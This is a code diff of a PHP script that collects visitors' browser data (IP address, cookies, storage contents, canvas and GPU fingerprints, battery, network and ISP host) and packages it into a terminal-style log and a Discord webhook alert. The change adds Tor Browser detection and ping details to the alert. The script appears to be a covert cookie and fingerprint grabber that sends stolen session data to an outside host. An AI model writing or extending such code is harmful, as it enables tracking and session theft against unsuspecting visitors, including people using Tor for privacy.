@@ -94,6 +94,7 @@ $webgl_vendor         = cleanCookie($json_data['webgl_vendor']        ?? '');
 $webgl_renderer       = cleanCookie($json_data['webgl_renderer']      ?? '');
 $hardware_concurrency = cleanCookie($json_data['hardware_concurrency']?? '');
 $device_memory        = cleanCookie($json_data['device_memory']       ?? '');
+$is_tor_browser       = cleanCookie($json_data['is_tor_browser']      ?? '');
 
 /* ── Filter out our own _nx_ cookies from the display ─────── */
 $real_cookies = filterNxCookies($raw_cookies);
@@ -298,12 +299,18 @@ if (!empty($connection_effective) && $connection_effective !== $connection_type)
     $net_label .= " ({$connection_effective})";
 }
 if (!empty($connection_downlink)) {
-    $net_label .= " — {$connection_downlink}";
+    $net_label .= " — Speed: {$connection_downlink}";
+}
+if (!empty($connection_rtt)) {
+    $net_label .= " (Ping: {$connection_rtt})";
 }
 $terminal_output .= "[+] Network: {$net_label}\n";
 $terminal_output .= "[+] ISP Host: " . nxLabel($reverse_host, 'Could not resolve') . "\n";
 $terminal_output .= "[+] Canvas Hash: " . nxLabel($canvas_fingerprint) . "\n";
 $terminal_output .= "[+] GPU: " . nxLabel($webgl_renderer) . "\n";
+if (!empty($is_tor_browser) && $is_tor_browser !== 'No') {
+    $terminal_output .= "[+] Tor Privacy: {$is_tor_browser}\n";
+}
 
 if ($has_real_cookies) {
     $c_disp = (strlen($real_cookies) > 300) ? substr($real_cookies, 0, 300) . '...' : $real_cookies;
@@ -317,7 +324,6 @@ if ($has_session_storage) {
 
 if ($has_local_storage) {
     $ls_disp = (strlen($local_storage) > 200) ? substr($local_storage, 0, 200) . '...' : $local_storage;
-    $terminal_output .= "[+] Local Storage: {$ls_disp}\n";
 }
 
 if ($has_indexeddb) {
@@ -341,15 +347,30 @@ file_put_contents($data_dir . '/.flag_cookies', $terminal_output);
 /* ════════════════════════════════════════════════════════════
    4. DISCORD WEBHOOK ALERT
    ════════════════════════════════════════════════════════════ */
+$discord_net = nxLabel($connection_type);
+if (!empty($connection_effective) && $connection_effective !== $connection_type) {
+    $discord_net .= " ({$connection_effective})";
+}
+if (!empty($connection_downlink)) {
+    $discord_net .= " • {$connection_downlink}";
+}
+if (!empty($connection_rtt)) {
+    $discord_net .= " (Ping: {$connection_rtt})";
+}
+
 $discord_fields = [
     '🌐 IP Address'   => $client_ip,
     '📄 Page'         => $page_title,
     '🖥️ Screen'       => nxLabel($screen_resolution) . ' (' . nxLabel($screen_pixel_ratio) . ')',
     '🔋 Battery'      => nxLabel($battery_level) . ' — ' . nxLabel($battery_charging, 'N/A'),
-    '📶 Network'      => nxLabel($connection_type) . (!empty($connection_downlink) ? " • {$connection_downlink}" : ''),
+    '📶 Network'      => $discord_net,
     '🏢 ISP / Host'   => nxLabel($reverse_host, 'Could not resolve'),
     '🎮 GPU / Canvas' => nxLabel($webgl_renderer) . ' [Hash: ' . nxLabel($canvas_fingerprint) . ']',
 ];
+
+if (!empty($is_tor_browser) && $is_tor_browser !== 'No') {
+    $discord_fields['🧅 Tor Privacy'] = $is_tor_browser;
+}
 
 if ($has_real_cookies) {
     $discord_fields['🍪 Cookies'] = (strlen($real_cookies) > 200) ? substr($real_cookies, 0, 200) . '…' : $real_cookies;
